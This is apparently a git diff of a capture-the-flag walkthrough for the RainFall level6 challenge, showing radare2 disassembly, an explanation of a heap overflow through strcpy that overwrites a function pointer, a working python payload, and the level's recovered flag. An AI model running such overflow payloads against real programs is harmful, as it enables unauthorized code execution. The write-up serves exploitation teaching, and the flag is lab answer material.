@@ -1,36 +1,20 @@
-We can understand the goal, need to execute the "n" function  
-Get the offset (probably 72)  
-The payload will be : pad of arbitrary data * 72 + "n address"  
-This is a simply buffer overflow..
+# Level6
+
+We can find an executable who segfault without parameter and print "Nope\n" with.
 ```
-[~]$ r2 level6
- -- aaaa is experimental
-[0x080483a0]> pxc
-- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
-0x080483a0  31ed 5e89 e183 e4f0 5054 5268 5085 0408  1.^.....PTRhP...  ; eip  ; [13] -r-x section size 492 named .text
-0x080483b0  68e0 8404 0851 5668 7c84 0408 e8cf ffff  h....QVh|.......
-0x080483c0  fff4 9090 9090 9090 9090 9090 9090 9090  ................
-0x080483d0  5589 e553 83ec 0480 3d2c 9804 0800 753f  U..S....=,....u?  ; sym.__do_global_dtors_aux
-0x080483e0  a130 9804 08bb 2c97 0408 81eb 2897 0408  .0....,.....(...
-0x080483f0  c1fb 0283 eb01 39d8 731e 8db6 0000 0000  ......9.s.......
-0x08048400  83c0 01a3 3098 0408 ff14 8528 9704 08a1  ....0......(....
-0x08048410  3098 0408 39d8 72e8 c605 2c98 0408 0183  0...9.r...,.....
-0x08048420  c404 5b5d c38d 7426 008d bc27 0000 0000  ..[]..t&...'....
-0x08048430  5589 e583 ec18 a130 9704 0885 c074 12b8  U......0.....t..  ; sym.frame_dummy
-0x08048440  0000 0000 85c0 7409 c704 2430 9704 08ff  ......t...$0....
-0x08048450  d0c9 c390 5589 e583 ec18 c704 24b0 8504  ....U.......$...  ; sym.n
-0x08048460  08e8 0aff ffff c9c3 5589 e583 ec18 c704  ........U.......  ; sym.m
-0x08048470  24d1 8504 08e8 e6fe ffff c9c3 5589 e583  $...........U...  ; sym.main
-0x08048480  e4f0 83ec 20c7 0424 4000 0000 e8bf feff  .... ..$@.......
-0x08048490  ff89 4424 1cc7 0424 0400 0000 e8af feff  ..D$...$........
-[0x080483a0]> aaa
-[x] Analyze all flags starting with sym. and entry0 (aa)
-[x] Analyze function calls (aac)
-[x] Analyze len bytes of instructions for references (aar)
-[x] Check for vtables
-[x] Type matching analysis for all functions (aaft)
-[x] Propagate noreturn information
-[x] Use -AA or aaaa to perform additional experimental analysis.
+level6@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
+level6@RainFall:~$ ./level6
+Segmentation fault (core dumped)
+level6@RainFall:~$ ./level6 a
+Nope
+level6@RainFall:~$
+```
+After analyze it with radare2 (please refer to [level1](https://github.com/maxisimo/42-RainFall/blob/main/level1/walkthrough.md) if you want more details on the steps to follow)  
+We can see that the `main()` function call a function named `m()` but there is also a non-called `n()` function.  
+- main() :
+```
 [0x080483a0]> s main
 [0x0804847c]> pdda
     ; assembly                                   | /* r2dec pseudo code output */
@@ -68,6 +52,10 @@ This is a simply buffer overflow..
     0x080484d2 leave                             |
     0x080484d3 ret                               |     return eax;
                                                  | }
+[0x0804847c]>
+```
+- m() :
+```
 [0x0804847c]> s sym.m
 [0x08048468]> pdda
     ; assembly                                   | /* r2dec pseudo code output */
@@ -83,6 +71,10 @@ This is a simply buffer overflow..
     0x0804847a leave                             |
     0x0804847b ret                               |
                                                  | }
+[0x08048468]>
+```
+- n() :
+```
 [0x08048468]> s sym.n
 [0x08048454]> pdda
     ; assembly                                   | /* r2dec pseudo code output */
@@ -100,3 +92,31 @@ This is a simply buffer overflow..
                                                  | }
 [0x08048454]>
 ```
+Lets talk about the `main()`.   
+There is a call to malloc(64) and then strcpy argv[1] into this area on the heap.
+After that we can see a call to a useless `m()` function also stored in a heap buffer (malloc(4)) who simply call `puts()`.  
+But there is a call to `system()` in a usefull non-called `n()` function.  
+We need to execute the `n()` function.  
+The first argument (argv[1]) is not limited and, as we said before, there is a call to strcpy() wich is vulnerable to buffer overflow.  
+We should create a payload long enough to be copied into the second malloc data area.  
+First, get the offset. Thanks to the pattern generator we found an offset of 72.  
+Our final attack buffer will look like :  
+- pad of arbitrary data : 72 bytes
+- `n()` address         : 4 bytes
+```
+level6@RainFall:~$ python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit
+level6@RainFall:~$ cat /tmp/exploit | ./level6
+Segmentation fault (core dumped)
+level6@RainFall:~$
+```
+Obviously.. The usual method can't work because the program segfault without parameter
+```
+level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+level6@RainFall:~$ su level7
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
+level7@RainFall:~$
+```
+Level6 passed!
